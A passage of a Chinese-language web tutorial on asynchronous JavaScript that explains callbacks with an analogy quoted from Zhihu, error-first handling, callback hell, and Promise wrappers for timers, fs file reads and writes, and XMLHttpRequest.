target="_blank" rel="noopener">www.b.com</a>  192.168.1.125:80</li><li><a href="http://www.c.com" target="_blank" rel="noopener">www.c.com</a>  192.168.1.125:80</li></ul></li><li>nginx<ul><li>监听 80</li><li><a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a> 127.0.0.1:3000</li><li><a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a>  127.0.0.1:4000</li><li><a href="http://www.c.com" target="_blank" rel="noopener">www.c.com</a>  127.0.0.1:5000</li></ul></li></ul><h2 id="第14章-异步编程"><a href="#第14章-异步编程" class="headerlink" title="第14章 异步编程"></a>第14章 异步编程</h2><p>回调函数（差）</p><p><img src="/images/4310973-f244fd91439f1e69.png" alt="img"></p><p>Promise（好）</p><p><img src="/images/4310973-50fc9497129afbf2.png" alt="img"></p><p>Async（更好）</p><p><img src="/images/4310973-d08c039d7ef0dada.png" alt="img"></p><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><h6 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h6><ul><li><a href="https://www.zhihu.com/question/19801131" target="_blank" rel="noopener">知乎 - 回调函数（callback）是什么？</a></li></ul><p>你寻求一个陌生人的帮助。</p><ul><li>等待他帮你完成这件事儿</li><li>回去继续你的工作，<strong>留一个电话给他（注册回调）</strong><ul><li>他帮我完整这件事儿之后我干嘛？</li><li>我决定，他只需要把结果告诉我</li><li>结果：有的结果由数据，有的结果无数据</li></ul></li><li>当他完成打你的电话通知你（调用回调函数）</li></ul><p>你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里<strong>留下了你的电话</strong>，过了几天店里有货了，店员就<strong>打了你的电话</strong>，然后你接到电话后就到店里去取了货。在这个例子里，<strong>你的电话号码就叫回调函数</strong>，<strong>你把电话留给店员就叫登记回调函数</strong>，店里后来有货了叫做触发了回调关联的事件，<strong>店员给你打电话叫做调用回调函数</strong>，你到店里去取货叫做响应回调事件。回答完毕。 作者：常溪玲链接：<a href="https://www.zhihu.com/question/19801131/answer/13005983来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。" target="_blank" rel="noopener">https://www.zhihu.com/question/19801131/answer/13005983来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a></p><p>我勒个去，一句话搞定的事，非得啰嗦那么多?</p><p>简单举例来说就是，我打电话找你帮忙办事，但是不确定什么时间办完，我让你办完了再电话通知我。我让你通知我就是我设定的回调函数！一般用于异步通信场景。如果我不挂电话，非等你办完了知道结果了再挂这就不属于异步通信，也无需回调！作者：柳明军链接：<a href="https://www.zhihu.com/question/19801131/answer/43799125来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。" target="_blank" rel="noopener">https://www.zhihu.com/question/19801131/answer/43799125来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a></p><h6 id="JavaScript-回调函数"><a href="#JavaScript-回调函数" class="headerlink" title="JavaScript 回调函数"></a>JavaScript 回调函数</h6><p>获取普通方法的返回值（方式一 return）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> add <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">}</span><span class="token keyword">const</span> ret <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// => 123</span></code></pre><p>获取普通方法的返回值（方式二 函数）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 是不是傻？同步回调，闲的蛋疼！</span><span class="token keyword">function</span> add <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">callback</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>对于上面的代码我们肯定会有疑问，是不是傻？干嘛搞这么麻烦，第一种明显就 OK 了，难道第二种只是一种方式问题吗，聪明人肯定会选择第一种。</p><p>那大家姑且就先把它当作一种方式吧，在这里是先让大家明白一个道理：<strong>在 JavaScript 中函数也是一种数据类型，函数也可以当作参数进行传递</strong> 。</p><p>那我们到底什么时候需要使用回调函数呢？</p><blockquote><p>请记住： <strong>当需要得到一个函数中的异步操作结果的时候，我们就必须使用回调函数了（上面的第二种方式）。</strong></p><ul><li>定时器</li><li>ajax</li><li>readFile、writeFile</li></ul></blockquote><p>请看下面的例子：</p><p>例如，获取一个函数中异步操作的结果：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> fn <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 我想调用 fn 得到这里的 num</span>    <span class="token keyword">const</span> num <span class="token operator">=</span> <span class="token number">123</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>想法一（行不通）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> fn <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 我想调用 fn 得到这里的 num</span>    <span class="token keyword">const</span> num <span class="token operator">=</span> <span class="token number">123</span>    <span class="token comment" spellcheck="true">// 从返回值角度来讲，这里的 return 也只是返回给了当前的函数，而非外部的 fn 函数</span>    <span class="token keyword">return</span> num  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 到这里 fn 函数就执行结束了，所以不可能得到里面 return 的结果</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>想法二（行不通）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> fn <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'函数开始执行'</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> num  <span class="token comment" spellcheck="true">// 定时器是异步的，所以遇到定时器不会等待，函数会继续往后执行</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 我想调用 fn 得到这里的 num</span>    num <span class="token operator">=</span> <span class="token number">123</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 到这里 fn 函数就执行结束了（定时器还没有被调用），所以你拿到的 num 就是 undefined</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>正确的方式（通过函数来接收异步操作结果，这就是回调函数，因为不是立即调用，而是回头再调用）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 2. 在 fn 函数中通过形参 callback 接收了 handler 函数</span><span class="token keyword">function</span> fn <span class="token punctuation">(</span>callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// var callback = handler</span>  <span class="token comment" spellcheck="true">// callback 就是我们的 handler</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'函数开始执行'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 定时器是异步的，所以遇到定时器不会等待，函数会继续往后执行</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 我想调用 fn 得到这里的 num</span>    <span class="token keyword">const</span> num <span class="token operator">=</span> <span class="token number">123</span>    <span class="token comment" spellcheck="true">// 定时器操作结束，我们就可以在这里调用 callback（也就是我们的 handler）函数，把结果 num 传递给了该函数</span>    <span class="token comment" spellcheck="true">// 我们这里调用 callback 也就是在调用 handler</span>    <span class="token function">callback</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 到这里 fn 函数就执行结束了（定时器还没有被调用），所以你拿到的 num 就是 undefined</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> handler <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'handler 函数被调用了：'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 1. 这里把 handler 传递到了 fn 函数中</span><span class="token function">fn</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span></code></pre><p>上面的方式比较繁琐，我们没必要单独定义一个全局函数，我们可以可以在调用的时候直接传递一个匿名函数即可：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> fn <span class="token punctuation">(</span>callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> num <span class="token operator">=</span> <span class="token number">123</span>    <span class="token function">callback</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'回调函数被执行了：'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="示例：封装原生的-ajax-操作"><a href="#示例：封装原生的-ajax-操作" class="headerlink" title="示例：封装原生的 ajax 操作"></a>示例：封装原生的 <code>ajax</code> 操作</h6><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest" target="_blank" rel="noopener">MDN - Using XMLHttpRequest</a></p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> reqListener <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> oReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>oReq<span class="token punctuation">.</span>onload <span class="token operator">=</span> reqListener<span class="token punctuation">;</span>oReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> <span class="token string">"yourFile.txt"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>oReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h6 id="示例：实现拷贝方法"><a href="#示例：实现拷贝方法" class="headerlink" title="示例：实现拷贝方法"></a>示例：实现拷贝方法</h6><p>已知 <code>fs.readFile</code> 可以读取文件，<code>fs.writeFile</code> 可以写文件。请帮我封装一个方法：<code>copy</code>。要求调用方式如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string">'被复制文件'</span><span class="token punctuation">,</span> <span class="token string">'复制到的目标文件'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// err 成功是 null 错误是一个 错误对象</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="示例：读取文件中的-todos-列表数据"><a href="#示例：读取文件中的-todos-列表数据" class="headerlink" title="示例：读取文件中的 todos 列表数据"></a>示例：读取文件中的 todos 列表数据</h6><p>已知一个 json 文件内容如下：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"todos"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"吃饭"</span><span class="token punctuation">,</span> <span class="token string">"睡觉"</span><span class="token punctuation">,</span> <span class="token string">"打豆豆"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>请帮我写一个方法，调用该方法得到的结果就是 todos <strong>数组</strong> 。</p><h6 id="示例：把任务持久化保存到文件中"><a href="#示例：把任务持久化保存到文件中" class="headerlink" title="示例：把任务持久化保存到文件中"></a>示例：把任务持久化保存到文件中</h6><p>已知有一个 json 文件内容如下：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"todos"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"吃饭"</span><span class="token punctuation">,</span> <span class="token string">"睡觉"</span><span class="token punctuation">,</span> <span class="token string">"打豆豆"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>请帮我写一个方法，调用该方法可以帮我把指定的数据存储到 json 文件中的 todos 中。例如：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 该方法肯定是异步的，所以无论操作成功与否你都必须告诉我</span><span class="token comment" spellcheck="true">// err 是错误的标志，如果有错你就告诉我，如果没错就给我一个 null</span><span class="token comment" spellcheck="true">// 那调用者就可以通过 err 参数来判定 addTodo 的操作结果到底成功与否</span><span class="token function">addTodo</span><span class="token punctuation">(</span><span class="token string">'写代码'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><hr><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><ul><li>try-catch</li><li>回调函数 Error First</li><li><strong>如果封装的函数中有错误，不要在函数中自行处理，一般是把错误对象放到回调函数的第一个参数，这是一种约定规则，错误优先，由调用者决定如何处理这个错误</strong></li><li>在自己封装的回调函数中不要自己处理错误</li><li>如果有错，则把错误对象作为回调函数的第一个参数传递给回调函数</li><li>错误优先：Error First</li></ul><h6 id="try-catch-处理异常"><a href="#try-catch-处理异常" class="headerlink" title="try-catch 处理异常"></a>try-catch 处理异常</h6><h6 id="Callback-处理异常"><a href="#Callback-处理异常" class="headerlink" title="Callback 处理异常"></a>Callback 处理异常</h6><h6 id="问题：回调地狱"><a href="#问题：回调地狱" class="headerlink" title="问题：回调地狱"></a>问题：回调地狱</h6><p><img src="/images/callback-hell.jpg" alt="callback-hell.jpg"></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./data/a.txt'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> dataA<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> err  <span class="token punctuation">}</span>  fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./data/b.txt'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> dataB<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> err    <span class="token punctuation">}</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./data/c.txt'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> dataC<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> err      <span class="token punctuation">}</span>      fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'./data/d.txt'</span><span class="token punctuation">,</span> dataA <span class="token operator">+</span> dataB <span class="token operator">+</span> dataC<span class="token punctuation">,</span> err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">throw</span> err        <span class="token punctuation">}</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h4><ul><li>一个容器，用来封装一个异步任务</li><li>三种状态<ul><li>Pending</li><li>Resolved</li><li>Rejected</li></ul></li><li>成功调用 resolve</li><li>失败调用 reject</li></ul><h6 id="Promise-基本用法"><a href="#Promise-基本用法" class="headerlink" title="Promise 基本用法"></a>Promise 基本用法</h6><h6 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h6><p>实例一：Promise 版本的定时器</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'吃饭'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'睡觉'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'坐火车回家'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>封装 Promise 版本的 <code>readFile</code> ：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      err <span class="token operator">?</span> <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./data/a.txt'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>另一个例子：读取文件</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      err <span class="token operator">?</span> <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      err <span class="token operator">?</span> <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">let</span> ret <span class="token operator">=</span> <span class="token string">''</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./data/a.txt'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ret <span class="token operator">+</span><span class="token operator">=</span> data    <span class="token keyword">return</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./data/b.txt'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ret <span class="token operator">+</span><span class="token operator">=</span> data    <span class="token keyword">return</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./data/c.txt'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ret <span class="token operator">+</span><span class="token operator">=</span> data    <span class="token comment" spellcheck="true">// fs.writeFile('./data/e.txt', ret, err => {</span>    <span class="token comment" spellcheck="true">// })</span>    <span class="token keyword">return</span> <span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'./data/e.txt'</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>示例：封装 Promise 版本的 ajax</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> ajax <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>ajax<span class="token punctuation">.</span><span class="token keyword">get</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> oReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oReq<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    oReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token 